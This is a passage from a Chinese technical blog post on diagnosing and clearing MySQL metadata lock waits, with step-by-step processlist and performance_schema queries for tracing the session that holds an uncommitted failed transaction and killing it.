uplooking | Query   |  275 | Waiting for table metadata lock | alter table booboo add q6 int default 0 |</span><br><span class="line">|  7 | root | localhost | uplooking | Sleep   |  269 |                                 | NULL                                    |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">| 10 | root | localhost | uplooking | Sleep   |  249 |                                 | NULL                                    |</span><br><span class="line">| 12 | root | localhost | uplooking | Sleep   |  191 |                                 | NULL                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看当前进程发现除了Alter之外没有对booboo表的操作</span></span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx <span class="built_in">where</span> trx_mysql_thread_id=id;</span></span><br><span class="line">+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+</span><br><span class="line">| timediff | sysdate()           | trx_started         | id | USER | DB        | COMMAND | STATE                           | trx_state | trx_query                               |</span><br><span class="line">+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+</span><br><span class="line">| 00:05:38 | 2017-08-18 20:21:07 | 2017-08-18 20:15:29 |  6 | root | uplooking | Query   | Waiting for table metadata lock | RUNNING   | alter table booboo add q6 int default 0 |</span><br><span class="line">| 00:05:38 | 2017-08-18 20:21:07 | 2017-08-18 20:15:29 | 10 | root | uplooking | Sleep   |                                 | RUNNING   | NULL                                    |</span><br><span class="line">+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看innodb_trx表可以看到除了alter之外有未完成的事务，但是看不到具体query，得到线程id为10</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 就可以<span class="built_in">kill</span> 10来结束事务</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 之后Alter正常操作</span></span><br></pre></td></tr></table></figure>

<h3 id="场景3"><a href="#场景3" class="headerlink" title="场景3"></a>场景3</h3><blockquote>
<p>与场景2对比的现象不同于：</p>
<ul>
<li>场景2：未完成事务中存在未完成事务</li>
<li>场景3：未完成事务中不存在未完成事务：确认有错误事务未提交或回滚，找到该事务的session_id然后杀死</li>
</ul>
</blockquote>
<ul>
<li>通过<code>show processlist</code>看不到<code>booboo</code>表有任何操作，在<code>information_schema.innodb_trx</code>中也没有任何进行中的事务。</li>
<li>这很可能是因为在一个显式的事务中，对<code>booboo</code>表进行了一个失败的操作（比如查询了一个不存在的字段），这时事务没有开始，但是失败语句获取到的锁依然有效。从<code>performance_schema.events_statements_current</code>表中可以查到失败的语句</li>
<li>也就是说除了语法错误，其他错误语句获取到的锁在这个事务提交或回滚之前，仍然不会释放掉。<code>because the failed statement is written to the binary log and the locks protect log consistency</code>但是解释这一行为的原因很难理解，因为错误的语句根本不会被记录到二进制日志</li>
<li>解决方法：确认有错误事务未提交或回滚，找到该事务的sessionid然后杀死（难点）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 场景3的出现和前两种不同</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看线程情况，看到alter操作metadata锁，还有其他的select操作有metadata锁</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 第一反应就是有可能是场景1，于是kill掉执行select的线程，再次查看线程情况，就只剩下执行alter线程了</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 接下来查看未完成的事务，如果是场景1，在kill掉冲突的线程后应该出现两种情况（A.alter操作正常执行B.线程中只有alter操作为waiting metadata lock状态；未完成事务中存在未完成事务）</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 但是却发现和B情况有所不同的是：未完成事务中不存在未完成事务，总结第三种情况(C.线程中只有alter操作为waiting metadata lock状态；未完成事务中不存在未完成事务）</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过搜索资料定位到是场景3，但资料中没有说怎么解决问题，又不能重新启动服务器，只有一个资料里提到了方法（确认有错误事务未提交或回滚，找到该事务的sessionid然后杀死，关键就是如何找到sessionid呢？performance_schema.events_statements_current中的thread_id为线程id并不是sessionid或者说会话id、连接id，如何通过thread_id找到session_id成为了难点？5.7中有个session表可以直接查到，而5.6中必须通过三表才能查到，分别为performance_schema.events_statements_current,performance_schema.threads,information_schema.processlist表。）</span></span><br><span class="line">=====================================================================================</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span>掉除了写操作以外的query</span></span><br><span class="line">select concat('kill ',id) from information_schema.processlist where State="Waiting for table metadata lock" and substring(info, 1, 5) not in ('alter' , 'optim', 'repai', 'lock ', 'drop ', 'creat');</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 寻找未提交或未回滚的错误事务，并<span class="built_in">kill</span>即可</span></span><br><span class="line">select t.processlist_id,t.processlist_time,e.sql_text from performance_schema.threads t,performance_schema.events_statements_current e where t.thread_id=e.thread_id and e.SQL_TEXT like '%t1%';</span><br><span class="line"><span class="meta">#</span><span class="bash"> 案例中假设是在t1表上有MDL锁，则，e.sql_text 近似匹配t1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 本方法5.5 5.6 5.7 都通用。</span></span><br><span class="line">=============================================================================</span><br></pre></td></tr></table></figure>

<p>第一步：模拟第三种情况，会话11执行一个显示事务，且query出现列错误，t1表中不存在xx列，不提交。</p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%5Cmdl01.png" alt=""></p>
<p>第二步：会话14中执行alter操作</p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl02.png" alt="mdl02"></p>
<p>第三步：执行一条query</p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl03.png" alt="mdl03"></p>
<p>第四步：会话15执行一个显示事务，查询t1表</p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl04.png" alt="mdl04"></p>
<p>第五步：查看当前的processlist情况，可以看到只要是对t1表的操作都出现了MDL锁等待；尝试通过第一种情况的解决方法找出阻塞的事务会话进行kill，发现不存在阻塞会话；查看当前未提交的事务发现返回空；通过过滤processlist中进行MDL锁等待且不是alter的会话id，进行kill。</p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl06.png" alt="mdl06"></p>
<p>第六步：只kill 12，15，留下执行alter的会话14；有人会想为什么都kill掉呢？因为即使现在kill掉了，t1表的MDL锁也不会释放掉，还不如留下会话14的ddl操作，等彻底解决了，自然就能执行这个操作。具体可以看下面的分析。</p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl07.png" alt="mdl07"></p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl08.png" alt="mdl08"></p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl09.png" alt="mdl09"></p>
<p>第七步：给大家做个测试，即使将会话14的alter动作kill掉：</p>
<ul>
<li>processlist中看不到任何等待MDL锁的会话；</li>
<li>sys.schema_table_lock_waits中也不存在表锁（5.7才有sys库）；</li>
<li>performance_schema.metadata_locks中也不存在任何锁记录；</li>
<li>会话16想再去执行alter操作，又开始了MDL锁等待。</li>
</ul>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl10.png" alt="mdl10"></p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl11.png" alt="mdl11"></p>
<p>第八步：此时就一定可以确定当前属于【<strong>有错误事务未提交或回滚导致的MDL锁</strong>】的情况了。我们找出这个错误事务，进行kill</p>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl12.png" alt="mdl12"></p>
<p>第九步：kill掉会话11后，成功将MDL锁释放。</p>
<blockquote>
<p>有人又会问咯：为什么不将数据库重启？</p>
<p>回答：</p>
<p>如果说——</p>
<ol>
<li><p>业务允许重启</p>
</li>
<li><p>不想找到问题的根源</p>
<p>那么重启吧</p>
</li>
</ol>
<p>如果说—— </p>
<ol>
<li><p>数据库上面多个库，关联多个业务，不能重启</p>
</li>
<li><p>想找到问题的根源，防止下次再次出现类似的问题</p>
<p>那么你懂的</p>
</li>
</ol>
<p>那么为什么不直接kill所有会话呢？同样如果你要找出问题的根源那么就排查，不想问为什么就直接kill吧，末尾有kill的脚本</p>
</blockquote>
<p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl13.png" alt="mdl13"></p>
<p>一步步分析如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;                                                                                                                                                                   </span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |   17 | Waiting for table metadata lock | alter table booboo add q9 int default 0 |</span><br><span class="line">|  7 | root | localhost | uplooking | Query   |   11 | Waiting for table metadata lock | select * from booboo                    |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">| 14 | root | localhost | uplooking | Query   |    5 | Waiting for table metadata lock | select * from booboo where id=3         |</span><br><span class="line">| 15 | root | localhost | uplooking | Sleep   |   28 |                                 | NULL                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx <span class="built_in">where</span> trx_mysql_thread_id=id;</span></span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">kill</span> 7 ;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">kill</span> 14;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;                                                                                                                                                                   </span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |   86 | Waiting for table metadata lock | alter table booboo add q9 int default 0 |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">| 15 | root | localhost | uplooking | Sleep   |   97 |                                 | NULL                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx <span class="built_in">where</span> trx_mysql_thread_id=id;</span></span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果符合情况C，需要去查看performance_schema.events_statements_current表中是否有对booboo的错误语句（这里的错误语句是非语法错误的，例如select中写了不存在的列等情况）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 从下面的查询结果可以看到，确实存在一个错误语句事件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过该错误语句事件的THREAD_ID，到performance_schema.threads表查到该线程对应的PROCESSLIST_ID，而PROCESSLIST_ID进程id等于processlist中的id</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from performance_schema.events_statements_current <span class="built_in">where</span> SQL_TEXT like <span class="string">'%booboo%'</span>\G;</span></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">              THREAD_ID: 31</span><br><span class="line">               EVENT_ID: 16</span><br><span class="line">           END_EVENT_ID: NULL</span><br><span class="line">             EVENT_NAME: statement/sql/alter_table</span><br><span class="line">                 SOURCE: socket_connection.cc:101</span><br><span class="line">            TIMER_START: 3292336129737000</span><br><span class="line">              TIMER_END: 3521408438190000</span><br><span class="line">             TIMER_WAIT: 229072308453000</span><br><span class="line">              LOCK_TIME: 0</span><br><span class="line">               SQL_TEXT: alter table booboo add q9 int default 0</span><br><span class="line">                 DIGEST: NULL</span><br><span class="line">            DIGEST_TEXT: NULL</span><br><span class="line">         CURRENT_SCHEMA: uplooking</span><br><span class="line">            OBJECT_TYPE: NULL</span><br><span class="line">          OBJECT_SCHEMA: NULL</span><br><span class="line">            OBJECT_NAME: NULL</span><br><span class="line">  OBJECT_INSTANCE_BEGIN: NULL</span><br><span class="line">            MYSQL_ERRNO: 0</span><br><span class="line">      RETURNED_SQLSTATE: NULL</span><br><span class="line">           MESSAGE_TEXT: NULL</span><br><span class="line">                 ERRORS: 0</span><br><span class="line">               WARNINGS: 0</span><br><span class="line">          ROWS_AFFECTED: 0</span><br><span class="line">              ROWS_SENT: 0</span><br><span class="line">          ROWS_EXAMINED: 0</span><br><span class="line">CREATED_TMP_DISK_TABLES: 0</span><br><span class="line">     CREATED_TMP_TABLES: 0</span><br><span class="line">       SELECT_FULL_JOIN: 0</span><br><span class="line"> SELECT_FULL_RANGE_JOIN: 0</span><br><span class="line">           SELECT_RANGE: 0</span><br><span class="line">     SELECT_RANGE_CHECK: 0</span><br><span class="line">            SELECT_SCAN: 0</span><br><span class="line">      SORT_MERGE_PASSES: 0</span><br><span class="line">             SORT_RANGE: 0</span><br><span class="line">              SORT_ROWS: 0</span><br><span class="line">              SORT_SCAN: 0</span><br><span class="line">          NO_INDEX_USED: 0</span><br><span class="line">     NO_GOOD_INDEX_USED: 0</span><br><span class="line">       NESTING_EVENT_ID: NULL</span><br><span class="line">     NESTING_EVENT_TYPE: NULL</span><br><span class="line">    NESTING_EVENT_LEVEL: 0</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">              THREAD_ID: 33</span><br><span class="line">               EVENT_ID: 74</span><br><span class="line">           END_EVENT_ID: NULL</span><br><span class="line">             EVENT_NAME: statement/sql/select</span><br><span class="line">                 SOURCE: socket_connection.cc:101</span><br><span class="line">            TIMER_START: 3521408132304000</span><br><span class="line">              TIMER_END: 3521408462141000</span><br><span class="line">             TIMER_WAIT: 329837000</span><br><span class="line">              LOCK_TIME: 184000000</span><br><span class="line">               SQL_TEXT: select * from performance_schema.events_statements_current where SQL_TEXT like '%booboo%'</span><br><span class="line">                 DIGEST: NULL</span><br><span class="line">            DIGEST_TEXT: NULL</span><br><span class="line">         CURRENT_SCHEMA: uplooking</span><br><span class="line">            OBJECT_TYPE: NULL</span><br><span class="line">          OBJECT_SCHEMA: NULL</span><br><span class="line">            OBJECT_NAME: NULL</span><br><span class="line">  OBJECT_INSTANCE_BEGIN: NULL</span><br><span class="line">            MYSQL_ERRNO: 0</span><br><span class="line">      RETURNED_SQLSTATE: NULL</span><br><span class="line">           MESSAGE_TEXT: NULL</span><br><span class="line">                 ERRORS: 0</span><br><span class="line">               WARNINGS: 0</span><br><span class="line">          ROWS_AFFECTED: 0</span><br><span class="line">              ROWS_SENT: 1</span><br><span class="line">          ROWS_EXAMINED: 0</span><br><span class="line">CREATED_TMP_DISK_TABLES: 0</span><br><span class="line">     CREATED_TMP_TABLES: 0</span><br><span class="line">       SELECT_FULL_JOIN: 0</span><br><span class="line"> SELECT_FULL_RANGE_JOIN: 0</span><br><span class="line">           SELECT_RANGE: 0</span><br><span class="line">     SELECT_RANGE_CHECK: 0</span><br><span class="line">            SELECT_SCAN: 1</span><br><span class="line">      SORT_MERGE_PASSES: 0</span><br><span class="line">             SORT_RANGE: 0</span><br><span class="line">              SORT_ROWS: 0</span><br><span class="line">              SORT_SCAN: 0</span><br><span class="line">          NO_INDEX_USED: 1</span><br><span class="line">     NO_GOOD_INDEX_USED: 0</span><br><span class="line">       NESTING_EVENT_ID: NULL</span><br><span class="line">     NESTING_EVENT_TYPE: NULL</span><br><span class="line">    NESTING_EVENT_LEVEL: 0</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">              THREAD_ID: 40</span><br><span class="line">               EVENT_ID: 8</span><br><span class="line">           END_EVENT_ID: 8</span><br><span class="line">             EVENT_NAME: statement/sql/select</span><br><span class="line">                 SOURCE: socket_connection.cc:101</span><br><span class="line">            TIMER_START: 3280938133699000</span><br><span class="line">              TIMER_END: 3280938258470000</span><br><span class="line">             TIMER_WAIT: 124771000</span><br><span class="line">              LOCK_TIME: 0</span><br><span class="line">               SQL_TEXT: select abc from booboo</span><br><span class="line">                 DIGEST: 871dd43dfdfb143e81439bbe7bf7b57e</span><br><span class="line">            DIGEST_TEXT: SELECT `abc` FROM `booboo` </span><br><span class="line">         CURRENT_SCHEMA: uplooking</span><br><span class="line">            OBJECT_TYPE: NULL</span><br><span class="line">          OBJECT_SCHEMA: NULL</span><br><span class="line">            OBJECT_NAME: NULL</span><br><span class="line">  OBJECT_INSTANCE_BEGIN: NULL</span><br><span class="line">            MYSQL_ERRNO: 1054</span><br><span class="line">      RETURNED_SQLSTATE: 42S22</span><br><span class="line">           MESSAGE_TEXT: Unknown column 'abc' in 'field list'</span><br><span class="line">                 ERRORS: 1</span><br><span class="line">               WARNINGS: 0</span><br><span class="line">          ROWS_AFFECTED: 0</span><br><span class="line">              ROWS_SENT: 0</span><br><span class="line">          ROWS_EXAMINED: 0</span><br><span class="line">CREATED_TMP_DISK_TABLES: 0</span><br><span class="line">     CREATED_TMP_TABLES: 0</span><br><span class="line">       SELECT_FULL_JOIN: 0</span><br><span class="line"> SELECT_FULL_RANGE_JOIN: 0</span><br><span class="line">           SELECT_RANGE: 0</span><br><span class="line">     SELECT_RANGE_CHECK: 0</span><br><span class="line">            SELECT_SCAN: 0</span><br><span class="line">      SORT_MERGE_PASSES: 0</span><br><span class="line">             SORT_RANGE: 0</span><br><span class="line">              SORT_ROWS: 0</span><br><span class="line">              SORT_SCAN: 0</span><br><span class="line">          NO_INDEX_USED: 0</span><br><span class="line">     NO_GOOD_INDEX_USED: 0</span><br><span class="line">       NESTING_EVENT_ID: NULL</span><br><span class="line">     NESTING_EVENT_TYPE: NULL</span><br><span class="line">    NESTING_EVENT_LEVEL: 0</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select THREAD_ID,DIGEST_TEXT from performance_schema.events_statements_current <span class="built_in">where</span> DIGEST_TEXT=<span class="string">"SELECT `abc` FROM `booboo`"</span>;</span></span><br><span class="line">+-----------+-----------------------------+</span><br><span class="line">| THREAD_ID | DIGEST_TEXT                 |</span><br><span class="line">+-----------+-----------------------------+</span><br><span class="line">|        40 | SELECT `abc` FROM `booboo`  |</span><br><span class="line">+-----------+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from performance_schema.threads <span class="built_in">where</span> thread_id=40\G;</span></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">          THREAD_ID: 40</span><br><span class="line">               NAME: thread/sql/one_connection</span><br><span class="line">               TYPE: FOREGROUND</span><br><span class="line">     PROCESSLIST_ID: 15</span><br><span class="line">   PROCESSLIST_USER: root</span><br><span class="line">   PROCESSLIST_HOST: localhost</span><br><span class="line">     PROCESSLIST_DB: uplooking</span><br><span class="line">PROCESSLIST_COMMAND: Sleep</span><br><span class="line">   PROCESSLIST_TIME: 402</span><br><span class="line">  PROCESSLIST_STATE: NULL</span><br><span class="line">   PROCESSLIST_INFO: NULL</span><br><span class="line">   PARENT_THREAD_ID: NULL</span><br><span class="line">               ROLE: NULL</span><br><span class="line">       INSTRUMENTED: YES</span><br><span class="line">            HISTORY: YES</span><br><span class="line">    CONNECTION_TYPE: Socket</span><br><span class="line">       THREAD_OS_ID: 22758</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select PROCESSLIST_ID from performance_schema.threads <span class="built_in">where</span> thread_id=40;</span></span><br><span class="line">+----------------+</span><br><span class="line">| PROCESSLIST_ID |</span><br><span class="line">+----------------+</span><br><span class="line">|             15 |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from information_schema.processlist <span class="built_in">where</span> id=(select PROCESSLIST_ID from performance_schema.threads <span class="built_in">where</span> thread_id=40);</span></span><br><span class="line">+----+------+-----------+-----------+---------+------+-------+------+</span><br><span class="line">| ID | USER | HOST      | DB        | COMMAND | TIME | STATE | INFO |</span><br><span class="line">+----+------+-----------+-----------+---------+------+-------+------+</span><br><span class="line">| 15 | root | localhost | uplooking | Sleep   |  466 |       | NULL |</span><br><span class="line">+----+------+-----------+-----------+---------+------+-------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">kill</span> 15;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 会话B</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> alter table booboo add q9 int default 0;</span></span><br><span class="line">Query OK, 0 rows affected (9 min 54.35 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<h2 id="小知识点总结"><a href="#小知识点总结" class="headerlink" title="小知识点总结"></a>小知识点总结</h2><h3 id="三张表的关系"><a href="#三张表的关系" class="headerlink" title="三张表的关系"></a>三张表的关系</h3><blockquote>
<p>MySQL 5.6</p>
</blockquote>
<ol>
<li><code>performance_schema</code>库中，<code>events_statements_current</code>表中<code>theard_id</code>与<code>threads</code>表中的<code>thread_id</code>相同</li>
<li><code>performance_schema</code>库中，threads表中，thread_id和processlist_id为对应关系，<code>thread_id</code>表示一个独特的线程标识符;<code>processlist_id</code>是<code>show processlist</code>显示的<code>id</code>值，连接标识符；而对于后台线程(与用户连接不相关的线程)，<code>PROCESSLIST_ID</code>为空，此值不是唯一的。</li>
<li><code>information_schema</code>库中,<code>PROCESSLIST</code>表是一个非标准表。<code>id</code>连接标识符，并由CONNECTION_ID()函数返回。</li>
</ol>
<table>
<thead>
<tr>
<th>performance_schema</th>
<th>performance_schema</th>
<th>performance_schema</th>
<th>information_schema</th>
</tr>
</thead>
<tbody><tr>
<td>events_statements_current</td>
<td>threads</td>
<td>threads</td>
<td>processlist</td>
</tr>
<tr>
<td>THREAD_ID</td>
<td>THREAD_ID</td>
<td>PROCESSLIST_ID</td>
<td>ID</td>
</tr>
</tbody></table>
<h3 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h3><ol>
<li>线程表中保存了所有线程的信息，有前台的有后台运行的；</li>
<li>如果是由连接产生的线程，一般都是前台线程，会分配一个processlist_id，可以在information_schema.processlist中看到</li>
</ol>
<h3 id="资料参考"><a href="#资料参考" class="headerlink" title="资料参考"></a>资料参考</h3><p><a href="https://dev.mysql.com/doc/refman/5.7/en/threads-table.html" target="_blank" rel="noopener">官网关于threads表的说明</a></p>
<p><a href="https://dev.mysql.com/doc/refman/5.7/en/show-processlist.html" target="_blank" rel="noopener">官方关于processlist表的说明</a></p>
<p><a href="http://www.voidcn.com/article/p-hjsjvnlz-bog.html" target="_blank" rel="noopener">MySQL5.7 MetaData Lock 案例分享</a></p>
<h3 id="不同版本"><a href="#不同版本" class="headerlink" title="不同版本"></a>不同版本</h3><blockquote>
<p>MySQL 5.7</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from performance_schema.events_statements_current\G</span><br><span class="line">select * from sys.x$session\G</span><br><span class="line">select * from sys.x$processlist\G</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from x$session\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">                thd_id: 3904</span><br><span class="line">               conn_id: 3879</span><br><span class="line">                  user: root@localhost</span><br><span class="line">                    db: sys</span><br><span class="line">               command: Query</span><br><span class="line">                 state: Sending data</span><br><span class="line">                  time: 0</span><br><span class="line">     current_statement: select * from x$session</span><br><span class="line">     statement_latency: 1564453000</span><br><span class="line">              progress: NULL</span><br><span class="line">          lock_latency: 847000000</span><br><span class="line">         rows_examined: 0</span><br><span class="line">             rows_sent: 0</span><br><span class="line">         rows_affected: 0</span><br><span class="line">            tmp_tables: 4</span><br><span class="line">       tmp_disk_tables: 1</span><br><span class="line">             full_scan: YES</span><br><span class="line">        last_statement: NULL</span><br><span class="line">last_statement_latency: NULL</span><br><span class="line">        current_memory: 0</span><br><span class="line">             last_wait: NULL</span><br><span class="line">     last_wait_latency: NULL</span><br><span class="line">                source: NULL</span><br><span class="line">           trx_latency: NULL</span><br><span class="line">             trx_state: NULL</span><br><span class="line">        trx_autocommit: NULL</span><br><span class="line">                   pid: 12880</span><br><span class="line">          program_name: mysql</span><br><span class="line">1 row in set (0.05 sec)</span><br><span class="line">mysql&gt; select * from  x$processlist limit 1\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">                thd_id: 1</span><br><span class="line">               conn_id: NULL</span><br><span class="line">                  user: sql&#x2F;main</span><br><span class="line">                    db: NULL</span><br><span class="line">               command: NULL</span><br><span class="line">                 state: NULL</span><br><span class="line">                  time: 230927</span><br><span class="line">     current_statement: NULL</span><br><span class="line">     statement_latency: NULL</span><br><span class="line">              progress: NULL</span><br><span class="line">          lock_latency: NULL</span><br><span class="line">         rows_examined: NULL</span><br><span class="line">             rows_sent: NULL</span><br><span class="line">         rows_affected: NULL</span><br><span class="line">            tmp_tables: NULL</span><br><span class="line">       tmp_disk_tables: NULL</span><br><span class="line">             full_scan: NO</span><br><span class="line">        last_statement: NULL</span><br><span class="line">last_statement_latency: NULL</span><br><span class="line">        current_memory: 0</span><br><span class="line">             last_wait: NULL</span><br><span class="line">     last_wait_latency: NULL</span><br><span class="line">                source: NULL</span><br><span class="line">           trx_latency: NULL</span><br><span class="line">             trx_state: NULL</span><br><span class="line">        trx_autocommit: NULL</span><br><span class="line">                   pid: NULL</span><br><span class="line">          program_name: NULL</span><br><span class="line">1 row in set (0.06 sec)</span><br><span class="line">mysql&gt; select * from information_schema.processlist;</span><br><span class="line">+------+------+-----------+------+---------+------+-----------+----------------------------------------------+</span><br><span class="line">| ID   | USER | HOST      | DB   | COMMAND | TIME | STATE     | INFO                                         |</span><br><span class="line">+------+------+-----------+------+---------+------+-----------+----------------------------------------------+</span><br><span class="line">| 3879 | root | localhost | sys  | Query   |    0 | executing | select * from information_schema.processlist |</span><br><span class="line">+------+------+-----------+------+---------+------+-----------+----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
